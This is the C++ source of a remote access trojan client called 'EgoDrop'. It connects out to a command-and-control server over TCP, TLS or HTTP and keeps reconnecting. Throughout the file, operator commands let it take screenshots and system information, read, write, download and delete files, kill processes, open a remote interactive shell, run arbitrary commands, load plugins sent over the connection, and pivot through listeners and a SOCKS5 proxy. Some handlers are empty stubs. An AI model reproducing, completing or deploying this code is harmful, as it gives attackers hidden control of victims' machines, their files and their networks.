/*
Name: EgoDrop's client.
Author: ISSAC

Introduction: RAT's client.
*/

#include <iostream>
#include <unistd.h>
#include <cstring>
#include <string>
#include <stdio.h>
#include <stdlib.h>
#include <sstream>
#include <vector>
#include <tuple>
#include <thread>
#include <chrono>
#include <map>
#include <variant>

#include <arpa/inet.h>

//OpenSSL
#include <openssl/ssl.h>
#include <openssl/err.h>

//Module
#include "clsEDP.hpp"
#include "clsTools.hpp"
#include "clsVictim.hpp"
#include "clsDebugTools.hpp"

#include "clsInfoSpyder.hpp"
#include "clsScreenshot.hpp"
#include "clsFileMgr.hpp"
#include "clsProcMgr.hpp"
#include "clsServMgr.hpp"
#include "clsLoader.hpp"
#include "clsShell.hpp"
#include "clsPluginMgr.hpp"

#include "clsLtnTcp.hpp"
#include "clsLtnTls.hpp"

#include "clsProxySocks5.hpp"

std::string g_szIP = "0.0.0.0";
uint16_t g_nPort = 5000;

const int g_nREAD_LENGTH = 65535;
std::ostringstream g_oss;
std::string g_szMethod;

enum enConnectionMethod
{
    TCP,
    TLS,
    HTTP,
    DNS,
};

clsShell* g_shell = nullptr;
clsPluginMgr* g_pluginMgr = nullptr;

std::unordered_map<int, std::shared_ptr<clsProxySocks5>> g_mapSocks5;
std::mutex g_mtxSocks5;

std::unordered_map<int, std::shared_ptr<clsLtn>> g_mapLtn;

/// @brief C2 command handler.
/// @param victim Victim class object.
/// @param vuMsg C2 message in list.
void fnRecvCommand(std::shared_ptr<clsVictim> victim, const std::vector<std::string>& vuMsg)
{
    try
    {
        if (vuMsg.size() == 0)
            return;

        std::vector<std::string> vsMsg;
        if (vuMsg[0].rfind("Hacked_", 0) == 0)
        {
            vsMsg.reserve(vuMsg.size() - 1);
            vsMsg.insert(vsMsg.end(), vuMsg.begin() + 1, vuMsg.end());

            clsInfoSpyder infoSpider;
            std::string szVictimID = vuMsg[0];
            if (szVictimID != "Hacked_" + infoSpider.m_info.m_szMachineID)
            {
                for(auto& [nPort, ltn] : g_mapLtn)
                {
                    ltn->fnSendToSub(szVictimID, vsMsg);
                }

                return;
            }
            else if (szVictimID == "Hacked_" + infoSpider.m_info.m_szMachineID && vuMsg[1].rfind("Hacked", 0) == 0)
            {
                for (auto& [nPort, ltn] : g_mapLtn)
                {
                    ltn->fnSendToSub(szVictimID, vsMsg);
                }

                return;
            }
            else
            {
                
            }
        }
        else
        {
            vsMsg.reserve(vuMsg.size());
            vsMsg.insert(vsMsg.end(), vuMsg.begin(), vuMsg.end());
        }

        if (vsMsg[0] == "info") //Information.
        {
            clsInfoSpyder spy;
            clsScreenshot screen;

            auto stInfo = spy.m_info;
            std::string szImg = "X";
            if (stInfo.m_bHasDesktop)
            {
                auto stImage = screen.fnScreenshot();
                szImg = clsEZData::fnb64Encode(stImage.vuData);
            }

            victim->m_szVictimID = "Hacked_" + stInfo.m_szMachineID;

            double dCpuUsage = spy.fnGetCpuUsage();
            std::ostringstream oss;
            oss << std::fixed << std::setprecision(2) << dCpuUsage;

            std::vector<std::string> vsInfo = {
                "info", //Flag.
                szImg, //Screenshot image base64 string.
                stInfo.m_bHasDesktop ? "1" : "0", //Machine has desktop.
                stInfo.m_szIPv4, //Victim's internal IPv4 address.
                victim->m_szVictimID, //Victim's id.
                stInfo.m_szUsername, //Username.
                std::to_string(stInfo.m_nUid), //Uid.
                stInfo.m_bIsRoot ? "1" : "0", //Is root?
                stInfo.m_szOSName, //Operating System.

                oss.str(), //CPU usage.
            };

            vsInfo.push_back(g_szMethod);

            victim->fnSendCommand(vsInfo);
        }
        else if (vsMsg[0] == "file") //File Manager.
        {
            clsFileMgr fileMgr;

            if (vsMsg[1] == "init") //Initialization.
            {
                std::vector<std::string> vsMsg = {
                    "file",
                    "init",
                    fileMgr.m_szInitFileDir,
                };

                victim->fnSendCommand(vsMsg);
            }
            else if (vsMsg[1] == "sd") //Scan directory.
            {
                auto ls = fileMgr.fnScandir(vsMsg[2]);
                std::vector<std::vector<std::string>> v2d;

                for (auto& s : ls)
                {
                    std::vector<std::string> x = {
                        s.mIsDir ? "1" : "0",
                        s.szFilePath,
                        std::to_string(s.nFileSize),
                        s.szPermission,
                        s.szCreationDate,
                        s.szLastModifiedDate,
                        s.szLastAccessedDate,
                    };

                    v2d.push_back(x);
                }

                std::vector<std::string> vuMsg = {
                    "file",
                    "sd",
                    vsMsg[2],
                    clsEZData::fnszSend2dParser(v2d, ","),
                };

                victim->fnSendCommand(vuMsg);
            }
            else if (vsMsg[1] == "wf") //Write file.
            {
                std::string szFilePath = vsMsg[2];
                std::string szFileContent = vsMsg[3];

                RETMSG msg = fileMgr.fntpWriteFile(szFilePath, szFileContent);
                auto [nCode, szPath] = msg;

                STRLIST ls = {
                    "file",
                    "wf",
                    std::to_string(nCode),
                    szPath,
                };

                victim->fnSendCommand(ls);
            }
            else if (vsMsg[1] == "rf") //Read file.
            {
                std::string szFilePath = vsMsg[2];

                RETMSG msg = fileMgr.fntpReadFile(szFilePath);
                auto [nCode, szContent] = msg;

                STRLIST ls = {
                    "file",
                    "rf",
                    std::to_string(nCode),
                    szFilePath,
                    szContent,
                };

                victim->fnSendCommand(ls);
            }
            else if (vsMsg[1] == "goto") //Check directory's existence.
            {
                std::string szPath = vsMsg[2];
                bool bExist = fileMgr.fnbDirExists(szPath);
                int nCode = (int)bExist;

                STRLIST ls = {
                    "file",
                    "goto",
                    std::to_string(nCode),
                    szPath,
                };

                victim->fnSendCommand(ls);
            }
            else if (vsMsg[1] == "df") //Download file.
            {
                std::string szFilePath = vsMsg[2];
                size_t nChunk = atoi(vsMsg[3].data());

                std::thread thDownload(
                    [&fileMgr, &victim, &szFilePath, nChunk]() 
                    {
                        fileMgr.fnDownloadFile(victim, szFilePath, nChunk);
                    }
                );

                thDownload.join();
            }
            else if (vsMsg[1] == "uf") //Upload file.
            {

            }
            else if (vsMsg[1] == "wget") //WGET.
            {

            }
            else if (vsMsg[1] == "del") //Delete.
            {
                STR szPath = vsMsg[2];
                auto[nCode, szMsg] = fileMgr.fntpDelete(szPath);

                STRLIST ls = {
                    "file",
                    "del",
                    std::to_string(nCode),
                    szPath,
                    szMsg,
                };

                victim->fnSendCommand(ls);
            }
            else if (vsMsg[1] == "cp") //Copy.
            {
                STR szSrcPath = vsMsg[2];
                STR szDstPath = vsMsg[3];

                auto[nCode, szMsg] = fileMgr.fntpCopy(szSrcPath, szDstPath);

                STRLIST ls = {
                    "file",
                    "cp",
                    std::to_string(nCode),
                    szSrcPath,
                    szDstPath,
                    szMsg,
                };

                victim->fnSendCommand(ls);
            }
            else if (vsMsg[1] == "mv") //Move.
            {
                STR szSrcPath = vsMsg[2];
                STR szDstPath = vsMsg[3];

                auto[nCode, szMsg] = fileMgr.fntpMove(szSrcPath, szDstPath);

                STRLIST ls = {
                    "file",
                    "mv",
                    std::to_string(nCode),
                    szSrcPath,
                    szDstPath,
                    szMsg,
                };

                victim->fnSendCommand(ls);
            }
            else if (vsMsg[1] == "img") //Get image base64.
            {
                std::string szFilePath = vsMsg[2];
                BUFFER abBuffer = fileMgr.fnabReadImage(szFilePath);
                std::string szb64Img = clsEZData::fnb64Encode(abBuffer);

                STRLIST ls = {
                    "file",
                    "img",
                    szFilePath,
                    szb64Img,
                };

                victim->fnSendCommand(ls);
            }
            else if (vsMsg[1] == "nd") //New directory
            {
                std::string szDirPath = vsMsg[2];
                auto [nCode, szMsg] = fileMgr.fnMkdir(szDirPath);

                STRLIST ls = {
                    "file",
                    "nd",
                    szDirPath,
                    std::to_string(nCode),
                    szMsg,
                };

                victim->fnSendCommand(ls);
            }
        }
        else if (vsMsg[0] == "proc") //Process Manager.
        {
            clsProcMgr procMgr;

            if (vsMsg[1] == "ls")
            {
                auto lsProc = procMgr.fnGetProcesses();
                STRLIST ls = {
                    "proc",
                    "ls",
                    procMgr.fnParser(lsProc),
                };

                victim->fnSendCommand(ls);
            }
            else if (vsMsg[1] == "kill")
            {
                pid_t pid = std::stoi(vsMsg[2]);
                auto[nCode, szMsg] = procMgr.fnKillProcess(pid);

                STRLIST ls = {
                    "proc",
                    "kill",
                    std::to_string(nCode),
                    szMsg,
                };

                victim->fnSendCommand(ls);
            }
            else if (vsMsg[1] == "stop")
            {
                pid_t pid = std::stoi(vsMsg[2]);
                auto[nCode, szMsg] = procMgr.fnStopProcess(pid);

                STRLIST ls = {
                    "proc",
                    "stop",
                    std::to_string(nCode),
                    szMsg,
                };

                victim->fnSendCommand(ls);
            }
            else if (vsMsg[1] == "cont")
            {
                pid_t pid = std::stoi(vsMsg[2]);
                auto[nCode, szMsg] = procMgr.fnContinueProcess(pid);

                STRLIST ls = {
                    "proc",
                    "conti",
                    std::to_string(nCode),
                    szMsg,
                };

                victim->fnSendCommand(ls);
            }
        }
        else if (vsMsg[0] == "srv") //Service Manager.
        {
            clsServMgr srvMgr;

            if (vsMsg[1] == "ls")
            {
                auto services = srvMgr.fnGetAllServices();

                std::vector<std::string> vsMsg = {
                    "srv",
                    "ls",
                    
                };

                victim->fnSendCommand(vsMsg);
            }
            else if (vsMsg[1] == "kill")
            {

            }
            else if (vsMsg[1] == "stop")
            {

            }
            else if (vsMsg[1] == "cont")
            {
                
            }
        }
        else if (vsMsg[0] == "shell") //Remote Shell.
        {
            if (vsMsg[1] == "start")
            {
                std::string szShellPath = vsMsg[2];
                std::string szInitPath = vsMsg[3];

                if (g_shell)
                {
                    g_shell->fnStop();
                    g_shell = nullptr;
                }

                if (!g_shell)
                {
                    g_shell = new clsShell(victim);
                    g_shell->fnStart(szShellPath, szInitPath);
                }
            }
            else if (vsMsg[1] == "stop")
            {
                if (g_shell)
                {
                    g_shell->fnStop();
                    g_shell = nullptr;
                }
            }
            else if (vsMsg[1] == "input")
            {
                if (!g_shell)
                {
                    clsTools::fnLogErr("g_shell == nullptr");
                    return;
                }

                auto bytes = clsEZData::fnb64Decode(vsMsg[2]);
                g_shell->fnPushInput(bytes);
            }
            else if (vsMsg[1] == "resize")
            {
                if (!g_shell)
                {
                    clsTools::fnLogErr("g_shell == nullptr");
                    return;
                }

                int nCol = std::stoi(vsMsg[2]);
                int nRow = std::stoi(vsMsg[3]);

                g_shell->fnResize(nCol, nRow);
            }
            else if (vsMsg[1] == "exec")
            {
                std::string szOutput = clsTools::fnExec(vsMsg[2]);

            }
        }
        else if (vsMsg[0] == "server") //Pivoting.
        {
            if (vsMsg[1] == "ls")
            {
                std::vector<std::string> vsPort;
                for(auto& [nPort, ltn] : g_mapLtn)
                {
                    vsPort.push_back(std::to_string(nPort));
                }

                STRLIST ls = {
                    "server",
                    "ls",
                    clsEZData::fnszSendParser(vsPort),
                };

                victim->fnSendCommand(ls);
            }
            else if (vsMsg[1] == "start")
            {
                if (vsMsg[2] == "TCP")
                {
                    int nPort = std::stoi(vsMsg[3]);
                    STR szRSAPublicKey = vsMsg[4];
                    STR szRSAPrivateKey = vsMsg[5];

                    auto it = g_mapLtn.find(nPort);
                    std::shared_ptr<clsLtn> ltn;

                    if (it == g_mapLtn.end())
                    {
                        ltn = std::make_shared<clsLtnTcp>(victim, nPort, szRSAPublicKey, szRSAPrivateKey);
                    }
                    else
                    {
                        ltn = it->second;
                    }

                    std::thread([ltn]() {
                        ltn->fnStart();
                    }).detach();

                    g_mapLtn[nPort] = ltn;
                }
                else if (vsMsg[2] == "TLS")
                {
                    int nPort = std::stoi(vsMsg[3]);
                    std::vector<uint8_t> abCert = clsEZData::fnb64Decode(vsMsg[4]);
                    std::string szPassword = vsMsg[5];

                    auto it = g_mapLtn.find(nPort);
                    std::shared_ptr<clsLtn> ltn;

                    clsTools::fnLogInfo(vsMsg[5]);

                    if (it == g_mapLtn.end())
                    {
                        auto tls = std::make_shared<clsLtnTls>(victim, nPort);
                        tls->fnSetCertificate(abCert, szPassword);


                        ltn = tls;
                    }
                    else
                    {
                        ltn = it->second;
                    }

                    std::thread([ltn]() {
                        ltn->fnStart();
                    }).detach();

                    g_mapLtn[nPort] = ltn;
                }
                else if (vsMsg[2] == "HTTP")
                {
                    //todo
                }

                STRLIST ls = {
                    "server",
                    "start",
                    "1",
                    "OK",
                };

                victim->fnSendCommand(ls);
            }
            else if (vsMsg[1] == "stop")
            {
                int nPort = std::stoi(vsMsg[2]);
                auto it = g_mapLtn.find(nPort);
                if (it == g_mapLtn.end())
                {
                    STRLIST ls = {
                        "server",
                        "stop",
                        "0",
                        "No listening at port: " + vsMsg[2],
                    };

                    victim->fnSendCommand(ls);

                    clsTools::fnLogErr("Cannot find listener: " + std::to_string(nPort));
                }
                else
                {
                    auto ltn = it->second;
                    ltn->fnStop();

                    g_mapLtn.erase(nPort);

                    STRLIST ls = {
                        "server",
                        "stop",
                        "1",
                        "OK",
                    };

                    victim->fnSendCommand(ls);

                    clsTools::fnLogInfo("Removed listener: " + std::to_string(nPort));
                }
            }
        }
        else if (vsMsg[0] == "proxy")
        {
            if (vsMsg[1] == "socks5")
            {
                if (vsMsg[2] == "open")
                {
                    int nStreamId = std::stoi(vsMsg[3]);
                    std::string szIPv4 = vsMsg[4];
                    int nPort = std::stoi(vsMsg[5]);

                    auto socks5Proxy = std::make_shared<clsProxySocks5>(victim, nStreamId, szIPv4, nPort);
                    
                    {
                        std::lock_guard<std::mutex> lock(g_mtxSocks5);
                        g_mapSocks5[nStreamId] = socks5Proxy;
                    }

                    if (!g_mapSocks5[nStreamId]->fnbOpen())
                    {
                        STRLIST ls = {
                            "proxy",
                            "socks5",
                            "open",
                            "0", //Failed.
                            std::to_string(nStreamId),
                        };

                        victim->fnSendCommand(ls);
                        //g_mapSocks5.erase(nStreamId);

                        clsTools::fnLogErr("Proxy open failed.");

                        return;
                    }

                    STRLIST ls = {
                        "proxy",
                        "socks5",
                        "open",
                        "1",
                        std::to_string(nStreamId),
                    };

                    victim->fnSendCommand(ls);

                    clsTools::fnLogOK("Proxy is opened.");
                }
                else if (vsMsg[2] == "data")
                {
                    int nStreamId = std::stoi(vsMsg[3]);
                    std::string b64 = vsMsg[4];

                    auto it = g_mapSocks5.find(nStreamId);
                    if (it == g_mapSocks5.end())
                    {
                        //todo: Send error.

                        return;
                    }

                    std::vector<uint8_t> raw = clsEZData::fnb64Decode(b64);
                    std::shared_ptr<clsProxySocks5> proxy;
                    {
                        std::lock_guard<std::mutex> lock(g_mtxSocks5);
                        auto it = g_mapSocks5.find(nStreamId);
                        if (it == g_mapSocks5.end())
                            return;

                        proxy = it->second;
                    }
                    proxy->fnForwarding(raw);
                }
                else if (vsMsg[2] == "close")
                {
                    int nStreamId = std::stoi(vsMsg[3]);

                    std::shared_ptr<clsProxySocks5> proxy;
                    {
                        std::lock_guard<std::mutex> lock(g_mtxSocks5);
                        auto it = g_mapSocks5.find(nStreamId);
                        if (it == g_mapSocks5.end())
                            return;

                        proxy = it->second;
                        g_mapSocks5.erase(it);
                    }
                    
                    proxy->fnClose();

                    clsTools::fnLogInfo("Close stream: " + std::to_string(nStreamId));
                }
            }
        }
        else if (vsMsg[0] == "plugin")
        {
            if (g_pluginMgr == nullptr)
            {
                g_pluginMgr = new clsPluginMgr(victim);
            }

            if (vsMsg[1] == "ls")
            {
                auto vPlugin = g_pluginMgr->fnListPlugins();
                std::vector<std::vector<std::string>> v2d; //2d vector.

                for (int i = 0; i < vPlugin.size(); i++)
                {
                    auto plugin = vPlugin[i]; //meta-data.
                    STRLIST tmp = {
                        plugin.szName,
                        std::to_string(plugin.uPluginVersion),
                        std::to_string(plugin.uAbiVersion),
                        plugin.szDescription,
                    };

                    v2d.push_back(tmp);
                }

                STRLIST ls = {
                    "plugin",
                    "ls",
                    clsEZData::fnszSend2dParser(v2d),
                };

                victim->fnSendCommand(ls);
            }
            else if (vsMsg[1] == "load")
            {
                std::string szName = vsMsg[2];
                std::vector<uint8_t> abBytes = clsEZData::fnb64Decode(vsMsg[3]);

                g_pluginMgr->fnLoadPlugin(szName, abBytes);

                /*
                STRLIST ls = {
                    "hello=world",
                };

                g_pluginMgr->fnRunPlugin(szName, ls);

                g_pluginMgr->fnUnloadPlugin(szName);
                */

                auto meta = g_pluginMgr->fnGetPluginMeta(szName);

                STRLIST ls = {
                    "plugin",
                    "load",
                    "1",
                    meta->szName,
                    std::to_string(meta->uAbiVersion),
                    std::to_string(meta->uPluginVersion),
                    meta->szDescription,
                };

                victim->fnSendCommand(ls);
            }
            else if (vsMsg[1] == "unload")
            {
                std::string szName = vsMsg[2];

                STRLIST ls = {
                    "plugin",
                    "unload",
                    szName,
                    g_pluginMgr->fnUnloadPlugin(szName) ? "1" : "0",
                };

                victim->fnSendCommand(ls);
            }
            else if (vsMsg[1] == "run")
            {
                std::string szName = vsMsg[2];

            }
            else if (vsMsg[1] == "clear")
            {

            }
        }
    }
    catch(const std::exception& e)
    {
        clsTools::fnLogErr(e.what());
    }

    return;
}

#pragma region Connection Handler

/// @brief Network stream handler for TCP method.
/// @param sktSrv 
void fnTcpHandler(int sktSrv)
{
    clsTools::fnLogInfo("Starting session...");


    int nRecv = 0;
    std::vector<unsigned char> vuStaticRecvBuf(g_nREAD_LENGTH);
    std::vector<unsigned char> vuDynamicRecvBuf;

    //clsVictim victim(clsVictim::enMethod::TCP, sktSrv);
    
    std::shared_ptr<clsVictim> victim = std::make_shared<clsVictim>(clsVictim::enMethod::TCP, sktSrv);

    // initial handshake
    victim->fnSendCmdParam(0, 0);

    do
    {
        // Receive data
        std::fill(vuStaticRecvBuf.begin(), vuStaticRecvBuf.end(), 0);
        nRecv = recv(sktSrv, vuStaticRecvBuf.data(), vuStaticRecvBuf.size(), 0);

        if (nRecv <= 0)
            break; // socket closed or error

        // Append to dynamic buffer
        vuDynamicRecvBuf.insert(
            vuDynamicRecvBuf.end(),
            vuStaticRecvBuf.begin(),
            vuStaticRecvBuf.begin() + nRecv);

        // --- Process complete packets ---
        while (true)
        {
            // not enough for header yet
            if (vuDynamicRecvBuf.size() < clsEDP::HEADER_SIZE)
                break;

            auto [nCommand, nParam, nLength] = clsEDP::fnGetHeader(vuDynamicRecvBuf);

            // incomplete packet — wait for next recv
            if (vuDynamicRecvBuf.size() < clsEDP::HEADER_SIZE + static_cast<size_t>(nLength))
                break;

            // construct EDP from full message
            clsEDP edp(vuDynamicRecvBuf);
            vuDynamicRecvBuf = edp.fnGetMoreData();  // consume one packet

            auto [cmd, param, len, vuMsg] = edp.fnGetMsg();

            // === handle packet ===
            if (cmd == 0)
            {
                if (param == 0)
                {
                    close(sktSrv);
                    return;
                }
            }
            else if (cmd == 1)
            {
                if (param == 0)
                {
                    // --- handshake stage 2: receive RSA key ---
                    std::string szb64RSAKey(reinterpret_cast<const char*>(vuMsg.data()), vuMsg.size());
                    std::vector<unsigned char> vuRSAKey = clsEZData::fnb64Decode(szb64RSAKey);

                    // create crypto with RSA key
                    clsCrypto crypto(vuRSAKey);
                    victim->m_crypto = std::make_unique<clsCrypto>(vuRSAKey);

                    // generate AES key+IV, encrypt, and send
                    auto [vuAESKey, vuAESIV] = victim->m_crypto->fnCreateAESKey();
                    std::vector<unsigned char> ucKey(vuAESKey.begin(), vuAESKey.end());
                    std::vector<unsigned char> ucIV(vuAESIV.begin(), vuAESIV.end());

                    std::ostringstream oss;
                    oss << clsEZData::fnb64Encode(ucKey) << "|" << clsEZData::fnb64Encode(ucIV);

                    std::string szMsg = oss.str();
                    std::string szCipherMsg = clsEZData::fnb64EncodeUtf8(victim->m_crypto->fnvuRSAEncrypt(szMsg));

                    victim->fnSend(1, 1, szCipherMsg);
                }
                else if (param == 2)
                {
                    std::string szChallenge(reinterpret_cast<const char*>(vuMsg.data()), vuMsg.size());
                    std::string szCipher = clsEZData::fnb64EncodeUtf8(victim->m_crypto->fnvuAESEncrypt(szChallenge));

                    victim->fnSend(1, 3, szCipher);
                }
            }
            else if (cmd == 2)
            {
                if (param == 0)
                {
                    std::vector<unsigned char> vuPlain = victim->m_crypto->fnvuAESDecrypt(vuMsg);
                    std::string szMsg(vuPlain.begin(), vuPlain.end());

                    auto decoded = clsEZData::fnvsB64ToVectorStringParser(szMsg);
                    
                    fnRecvCommand(victim, decoded);
                }
            }
        }

    } while (nRecv > 0);

    clsTools::fnLogInfo("Session is terminated.");

    return;
}

/// @brief Network stream handler for HTTP method.
/// @param sktSrv 
void fnHttpHandler(int sktSrv)
{
    clsTools::fnLogInfo("Starting session...");

    int nMaxRecv = 1024 * 1024 * 10;
    int nRecv = 0;
    std::vector<unsigned char> vuStaticRecvBuf(g_nREAD_LENGTH);
    std::vector<unsigned char> vuDynamicRecvBuf;

    clsHttpPkt http;
    //clsVictim victim(clsVictim::enMethod::HTTP, sktSrv, http);
    std::shared_ptr<clsVictim> victim = std::make_shared<clsVictim>(clsVictim::enMethod::HTTP, sktSrv, http);

    // initial handshake
    //victim->fnSendCmdParam(0, 0);

    victim->fnSend(1, 0, clsEZData::fnszGenerateRandomStr());

    do
    {
        vuDynamicRecvBuf.clear();
        std::fill(vuStaticRecvBuf.begin(), vuStaticRecvBuf.end(), 0);
        nRecv = recv(sktSrv, vuStaticRecvBuf.data(), vuStaticRecvBuf.size(), 0);

        if (nRecv <= 0)
            break; // socket closed or error

        // Append to dynamic buffer
        vuDynamicRecvBuf.insert(
            vuDynamicRecvBuf.end(),
            vuStaticRecvBuf.begin(),
            vuStaticRecvBuf.begin() + nRecv);

        std::string szRecv(vuDynamicRecvBuf.begin(), vuDynamicRecvBuf.end());
        
        auto result = clsHttpPkt::fnParseHttpResponse(szRecv);
        std::string szBody = result.szBody;
        BUFFER abMsg = clsEZData::fnb64Decode(szBody);
        clsEDP edp(abMsg);
        
        auto[nCommand, nParam, nLength, vuMsg] = edp.fnGetMsg();
        std::string szMsg(vuMsg.begin(), vuMsg.end());

        if (nCommand == 0)
        {
            if (nParam == 0)
            {

            }
        }
        else if (nCommand == 1)
        {
            if (nParam == 0)
            {
                BUFFER abRsaPublicKey = clsEZData::fnb64Decode(szMsg);

                // create crypto with RSA key
                victim->m_crypto = std::make_unique<clsCrypto>(abRsaPublicKey);

                // generate AES key+IV, encrypt, and send
                auto [vuAESKey, vuAESIV] = victim->m_crypto->fnCreateAESKey();
                BUFFER ucKey(vuAESKey.begin(), vuAESKey.end());
                BUFFER ucIV(vuAESIV.begin(), vuAESIV.end());

                std::ostringstream oss;
                oss << clsEZData::fnb64Encode(ucKey) << "|" << clsEZData::fnb64Encode(ucIV);

                std::string szMsg = oss.str();
                std::string szCipherMsg = clsEZData::fnb64EncodeUtf8(victim->m_crypto->fnvuRSAEncrypt(szMsg));

                victim->fnSend(1, 1, szCipherMsg);
            }
            else if (nParam == 2)
            {
                std::string szChallenge(reinterpret_cast<const char*>(vuMsg.data()), vuMsg.size());
                std::string szCipher = clsEZData::fnb64EncodeUtf8(victim->m_crypto->fnvuAESEncrypt(szChallenge));

                victim->fnSend(1, 3, szCipher);
            }
        }
        else if (nCommand == 2)
        {
            if (nParam == 0)
            {
                std::vector<unsigned char> vuPlain = victim->m_crypto->fnvuAESDecrypt(vuMsg);
                std::string szMsg(vuPlain.begin(), vuPlain.end());

                auto decoded = clsEZData::fnvsB64ToVectorStringParser(szMsg);
             
                fnRecvCommand(victim, decoded);
            }
        }

    } while (nRecv > 0);

    clsTools::fnLogErr("Session is terminated.");

    return;
}

/// @brief Network stream handler for TLS method.
/// @param nSktSrv 
/// @param ssl 
void fnTlsHandler(int nSktSrv, SSL* ssl)
{
    clsTools::fnLogInfo("Starting session...");

    //clsVictim victim(clsVictim::enMethod::TLS, nSktSrv, ssl);
    std::shared_ptr<clsVictim> victim = std::make_shared<clsVictim>(clsVictim::enMethod::TLS, nSktSrv, ssl);
    std::string szHello = "Hello TLS Server";

    victim->fnSendCommand(szHello);

    std::vector<unsigned char> vuStaticRecvBuf(g_nREAD_LENGTH);
    std::vector<unsigned char> vuDynamicRecvBuf;
    int nRecv = 0;

    do
    {
        // Receive data
        std::fill(vuStaticRecvBuf.begin(), vuStaticRecvBuf.end(), 0);
        nRecv = SSL_read(ssl, vuStaticRecvBuf.data(), vuStaticRecvBuf.size());

        if (nRecv <= 0)
            break; // socket closed or error

        // Append to dynamic buffer
        vuDynamicRecvBuf.insert(
            vuDynamicRecvBuf.end(),
            vuStaticRecvBuf.begin(),
            vuStaticRecvBuf.begin() + nRecv);

        // --- Process complete packets ---
        while (true)
        {
            // not enough for header yet
            if (vuDynamicRecvBuf.size() < clsEDP::HEADER_SIZE)
                break;

            auto [nCommand, nParam, nLength] = clsEDP::fnGetHeader(vuDynamicRecvBuf);

            // incomplete packet — wait for next recv
            if (vuDynamicRecvBuf.size() < clsEDP::HEADER_SIZE + static_cast<size_t>(nLength))
                break;

            // construct EDP from full message
            clsEDP edp(vuDynamicRecvBuf);
            vuDynamicRecvBuf = edp.fnGetMoreData();  // consume one packet

            auto [cmd, param, len, vuMsg] = edp.fnGetMsg();

            std::string szMsg(vuMsg.begin(), vuMsg.end());

            auto decoded = clsEZData::fnvsB64ToVectorStringParser(szMsg);
            
            fnRecvCommand(victim, decoded);
        }

    } while (nRecv > 0);
    
    clsTools::fnLogInfo("Session is terminated.");

    return;
}

#pragma endregion

#pragma region Connection

/// @brief Connect to the C2 server via TCP method.
/// @param szIP 
/// @param nPort 
void fnTcpConnect(std::string& szIP, int nPort)
{
    try
    {
        int sktSrv = socket(AF_INET, SOCK_STREAM, 0);
        sockaddr_in srvAddr {};
        srvAddr.sin_family = AF_INET;
        srvAddr.sin_port   = htons(nPort);
        inet_pton(AF_INET, szIP.data(), &srvAddr.sin_addr);

        if (connect(sktSrv, (struct sockaddr *)&srvAddr, sizeof(srvAddr)) < 0)
        {
            perror("connect");
        }
        else
        {
            fnTcpHandler(sktSrv);
        }
    }
    catch(const std::exception& e)
    {
        std::cerr << e.what() << '\n';
    }
    
    return;
}

/// @brief Connect to the C2 server via TLS method.
/// @param szIP 
/// @param nPort 
void fnTlsConnect(std::string& szIP, int nPort)
{
    SSL_library_init();
    SSL_load_error_strings();

    const SSL_METHOD* method = TLS_client_method();
    SSL_CTX* ctx = SSL_CTX_new(method);

    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, nullptr);

    int sktSrv = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in srvAddr {};
    srvAddr.sin_family = AF_INET;
    srvAddr.sin_port = htons(nPort);
    inet_pton(AF_INET, szIP.data(), &srvAddr.sin_addr);
    
    if (connect(sktSrv, (struct sockaddr *)&srvAddr, sizeof(srvAddr)) < 0)
    {
        perror("connect");
    }

    SSL* ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sktSrv);
    if (SSL_connect(ssl) <= 0)
    {
        ERR_print_errors_fp(stderr);
        return;
    }

    fnTlsHandler(sktSrv, ssl);

    SSL_CTX_free(ctx);

    return;
}

/// @brief Connect to the C2 server via HTTP method.
/// @param szIP 
/// @param nPort 
void fnHttpConnect(std::string& szIP, int nPort)
{
    int sktSrv = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in srvAddr {};
    srvAddr.sin_family = AF_INET;
    srvAddr.sin_port = htons(nPort);
    inet_pton(AF_INET, szIP.data(), &srvAddr.sin_addr);

    if (connect(sktSrv, (struct sockaddr *)&srvAddr, sizeof(srvAddr)) < 0)
    {
        perror("connect");
    }
    else
    {
        fnHttpHandler(sktSrv);
    }

    close(sktSrv);

    return;
}

/// @brief Connect to the C2 server via DNS method.
/// @param szDomain 
void fnDnsConnect(std::string& szDomain)
{
    //todo
}

#pragma endregion

int main(int argc, char *argv[])
{
    enConnectionMethod enMethod;

    if (argc >= 3)
    {
        g_szIP = argv[1];
        g_nPort = atoi(argv[2]);

        std::ostringstream oss;

        oss << "Input host: " << g_szIP << ":" << g_nPort;
        clsTools::fnLogInfo(oss.str());
        oss.clear();

        if (argc == 4)
        {
            std::string method(argv[3]);
            method = clsEZData::fnStrToUpper(method);

            clsTools::fnLogInfo("Method: " + method);

            if (method == "TCP")
                enMethod = enConnectionMethod::TCP;
            else if (method == "TLS")
                enMethod = enConnectionMethod::TLS;
            else if (method == "HTTP")
                enMethod = enConnectionMethod::HTTP;
            else if (method == "DNS")
                enMethod = enConnectionMethod::DNS;
            else
                enMethod == enConnectionMethod::TLS;

            g_szMethod = method;
        }
    }

    while (true)
    {
        switch (enMethod)
        {
            case enConnectionMethod::TCP:
                fnTcpConnect(g_szIP, g_nPort);
                break;
            case enConnectionMethod::TLS:
                fnTlsConnect(g_szIP, g_nPort);
                break;
            case enConnectionMethod::HTTP:
                fnHttpConnect(g_szIP, g_nPort);
                break;
            default:
                fnTcpConnect(g_szIP, g_nPort);
                break;
        }

        std::this_thread::sleep_for(std::chrono::milliseconds(1000));

    }

    return 0;
}